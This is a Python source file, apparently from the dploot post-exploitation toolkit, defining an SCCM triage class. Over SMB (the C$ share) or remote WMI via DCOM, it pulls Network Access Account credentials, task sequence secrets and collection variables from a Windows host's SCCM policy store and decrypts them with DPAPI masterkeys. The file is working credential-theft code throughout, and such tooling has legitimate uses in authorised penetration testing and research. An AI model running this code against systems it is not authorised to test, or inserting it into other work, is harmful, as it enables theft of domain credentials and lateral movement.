import logging
from typing import Any, List, Tuple
import re

from dploot.lib.dpapi import decrypt_blob, find_masterkey_for_blob
from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target
from dploot.triage.masterkeys import Masterkey
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.dcomrt import DCOMConnection


class SCCM:
    @classmethod
    def member_to_string(cls, member):
        return member.decode("utf-16le", errors="backslashreplace").rstrip("\0")

    def dump(self) -> None:
        print(self.description_header)
        for name, value in self.__dict__.items():
            print("\t%8s:\t%s" % (name.capitalize(), self.member_to_string(value)))

    def dump_quiet(self) -> None:
        print(
            f'{self.quiet_description_header} {":".join([self.member_to_string(_) for _ in self.__dict__.values()])}'
        )

    def __eq__(self, other) -> bool:
        return all(getattr(self, name) == getattr(other, name) for name in self.__dict__)

    def __hash__(self) -> int:
        return hash(tuple(self.__dict__.values()))


class SCCMCred(SCCM):
    description_header = "[NAA Account]"
    quiet_description_header = "[NAA]"

    def __init__(self, username: bytes, password: bytes) -> None:
        self.username = username
        self.password = password


class SCCMSecret(SCCM):
    description_header = "[Task sequences secret]"
    quiet_description_header = "[Task]"

    def __init__(self, secret) -> None:
        self.secret = secret


class SCCMCollection(SCCM):
    description_header = "[Collection Variable]"
    quiet_description_header = "[Collection]"

    def __init__(self, variable: bytes, value: bytes) -> None:
        self.variable = variable
        self.value = value


class SCCMTriage:
    sccm_objectdata_filepath = "Windows\\System32\\wbem\\Repository\\OBJECTS.DATA"
    share = "C$"

    regex_naa = rb"CCM_NetworkAccessAccount\x00\x00<PolicySecret Version=\"1\"><!\[CDATA\[(.*?)\]\]><\/PolicySecret>\x00\x00<PolicySecret Version=\"1\"><!\[CDATA\[(.*?)\]\]><\/PolicySecret>"
    regex_task = rb"</SWDReserved>.*?<PolicySecret Version=\"1\"><!\[CDATA\[(.*?)\]\]><\/PolicySecret>"
    regex_collection = rb"CCM_CollectionVariable\x00\x00(.*?)\x00\x00.*?<PolicySecret Version=\"1\"><!\[CDATA\[(.*?)\]\]><\/PolicySecret>"

    def __init__(
        self,
        target: Target,
        conn: DPLootSMBConnection,
        masterkeys: List[Masterkey],
        per_secret_callback: Any = None,
    ) -> None:
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.looted_files = {}

        self.per_secret_callback = per_secret_callback

        self.dcom_conn = None

    def decrypt_sccm_secret(self, dpapi_blob, from_wmi: bool = False):
        list_blob = [int(dpapi_blob[i:i + 2], 16) for i in range(0, len(dpapi_blob), 2)][4:] if from_wmi else list(bytes.fromhex(dpapi_blob.decode("utf-8")))[4:]
        blob_bytes = bytes(list_blob)

        masterkey = find_masterkey_for_blob(blob_bytes, masterkeys=self.masterkeys)
        result = ""
        if masterkey is not None:
            result = decrypt_blob(blob_bytes, masterkey=masterkey)
        else:
            logging.debug("Master keys not found for SCCM blob")
        return result

    def parse_sccm_objectfile(
        self, objectfile
    ) -> Tuple[List[SCCMCred], List[SCCMSecret], List[SCCMCollection]]:
        sccm_creds = []
        sccm_task_sequences = []
        sccm_collections = []

        logging.debug("Looking for NAA Credentials from OBJECTS.DATA file")
        pattern = re.compile(self.regex_naa)
        for match in pattern.finditer(objectfile):
            logging.debug(
                f"Found NAA Credentials from OBJECTS.DATA file: {match.start()} - {match.end()}"
            )
            password = self.decrypt_sccm_secret(match.group(1))
            username = self.decrypt_sccm_secret(match.group(2))
            sccm_cred = SCCMCred(username, password)
            sccm_creds.append(sccm_cred)
            if self.per_secret_callback is not None:
                self.per_secret_callback(sccm_cred)

        pattern = re.compile(self.regex_task)
        logging.debug("Looking for task sequences secret from OBJECTS.DATA file")
        for match in pattern.finditer(objectfile):
            logging.debug(
                f"Found task sequences secret from OBJECTS.DATA file: {match.start()} - {match.end()}"
            )
            task_seq = SCCMSecret(self.decrypt_sccm_secret(match.group(1)))
            sccm_task_sequences.append(task_seq)
            if self.per_secret_callback is not None:
                self.per_secret_callback(task_seq)

        pattern = re.compile(self.regex_collection)
        logging.debug("Looking for collection variables from OBJECTS.DATA file")
        for match in pattern.finditer(objectfile):
            try:
                logging.debug(
                    f"Found collection variable from OBJECTS.DATA file: {match.start()} - {match.end()}"
                )
                name = match.group(1).decode("utf-8").encode("utf-16le")
                value = self.decrypt_sccm_secret(match.group(2))
                sccm_collection = SCCMCollection(name, value)
                sccm_collections.append(sccm_collection)
                if self.per_secret_callback is not None:
                    self.per_secret_callback(sccm_collection)
            except Exception as e:
                logging.debug(f"Exception encountered in {__name__}: {e}.")

        return sccm_creds, sccm_task_sequences, sccm_collections

    def parse_wmi_reply(self, iEnum):
        finding = []
        regex = r"<PolicySecret Version=\"1\"><!\[CDATA\[(.*?)\]\]><\/PolicySecret>"
        while True:
            try:
                pEnum = iEnum.Next(0xFFFFFFFF, 1)[0]
                record = pEnum.getProperties()

                if (
                    "NetworkAccessUsername" in record
                    and "NetworkAccessPassword" in record
                    and len(record["NetworkAccessUsername"]["value"]) > 0
                    and len(record["NetworkAccessPassword"]["value"]) > 0
                ):
                    logging.debug("Found NAA Credentials using WMI")
                    username = self.decrypt_sccm_secret(
                        re.match(regex, record["NetworkAccessUsername"]["value"]).group(
                            1
                        ),
                        from_wmi=True,
                    )
                    password = self.decrypt_sccm_secret(
                        re.match(regex, record["NetworkAccessPassword"]["value"]).group(
                            1
                        ),
                        from_wmi=True,
                    )
                    sccm_naa = SCCMCred(username, password)
                    finding.append(sccm_naa)
                    if self.per_secret_callback is not None:
                        self.per_secret_callback(sccm_naa)

                if (
                    "Name" in record
                    and "Value" in record
                    and len(record["Name"]["value"]) > 0
                    and len(record["value"]["value"]) > 0
                ):
                    logging.debug("Found collection variables using WMI")
                    name = self.decrypt_sccm_secret(
                        re.match(regex, record["name"]["value"]).group(1), from_wmi=True
                    )
                    value = self.decrypt_sccm_secret(
                        re.match(regex, record["value"]["value"]).group(1),
                        from_wmi=True,
                    )
                    sccm_collection = SCCMCollection(name, value)
                    finding.append(sccm_collection)
                    if self.per_secret_callback is not None:
                        self.per_secret_callback(sccm_collection)

                if "TS_Sequence" in record and len(record["TS_Sequence"]["value"]) > 0:
                    logging.debug("Found task sequences secret using WMI")
                    secret = self.decrypt_sccm_secret(
                        re.match(regex, record["TS_Sequence"]["value"]).group(1),
                        from_wmi=True,
                    )
                    sccm_ts = SCCMSecret(secret)
                    finding.append(sccm_ts)
                    if self.per_secret_callback is not None:
                        self.per_secret_callback(sccm_ts)

            except Exception as e:
                if str(e).find("S_FALSE") > 0:
                    break
                if logging.getLogger().level == logging.DEBUG:
                    import traceback

                    traceback.print_exc()
                    raise
                else:
                    break
        iEnum.RemRelease()
        return finding

    def wmi_collect_sccm_secrets(
        self,
    ) -> Tuple[List[SCCMCred], List[SCCMSecret], List[SCCMCollection]]:
        sccm_cred = []
        sccm_task = []
        sccm_collection = []
        namespace = "root\\ccm\\Policy\\Machine\\RequestedConfig"
        query_naa = "SELECT NetworkAccessUsername, NetworkAccessPassword FROM CCM_NetworkAccessAccount"
        query_task = "SELECT TS_Sequence FROM CCM_TaskSequence"
        query_collection = "SELECT Name, Value FROM CCM_CollectionVariable"
        try:
            self.dcom_conn = DCOMConnection(
                self.target.address,
                self.target.username,
                self.target.password,
                self.target.domain,
                self.target.lmhash,
                self.target.nthash,
                self.target.aesKey,
                oxidResolver=True,
                doKerberos=self.target.do_kerberos,
                kdcHost=self.target.dc_ip,
            )
            iInterface = self.dcom_conn.CoCreateInstanceEx(
                wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login
            )
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices = iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)
            iWbemLevel1Login.RemRelease()

            logging.debug("Query WMI for Network access accounts")
            iEnumWbemClassObject = iWbemServices.ExecQuery(query_naa)
            sccm_cred = self.parse_wmi_reply(iEnumWbemClassObject)

            logging.debug("Query WMI for Task sequences")
            iEnumWbemClassObject = iWbemServices.ExecQuery(query_task)
            sccm_task = self.parse_wmi_reply(iEnumWbemClassObject)

            logging.debug("Query WMI for collection variables")
            iEnumWbemClassObject = iWbemServices.ExecQuery(query_collection)
            sccm_collection = self.parse_wmi_reply(iEnumWbemClassObject)

            iEnumWbemClassObject.RemRelease()
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback

                traceback.print_exc()
                logging.debug(str(e))
        finally:
            if self.dcom_conn is not None:
                self.dcom_conn.disconnect()
        return sccm_cred, sccm_task, sccm_collection

    def triage_sccm(
        self, use_wmi: bool
    ) -> Tuple[List[SCCMCred], List[SCCMSecret], List[SCCMCollection]]:
        sccm_cred = []
        sccm_task = []
        sccm_collection = []
        try:
            if use_wmi:
                sccm_cred, sccm_task, sccm_collection = self.wmi_collect_sccm_secrets()
            else:
                objectfile = self.conn.readFile(
                    self.share,
                    self.sccm_objectdata_filepath,
                    bypass_shared_violation=True,
                    looted_files=self.looted_files
                )
                if objectfile is not None and len(objectfile) > 0:
                    sccm_cred, sccm_task, sccm_collection = self.parse_sccm_objectfile(
                        objectfile
                    )
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback

                traceback.print_exc()
                logging.debug(str(e))
        return sccm_cred, sccm_task, sccm_collection
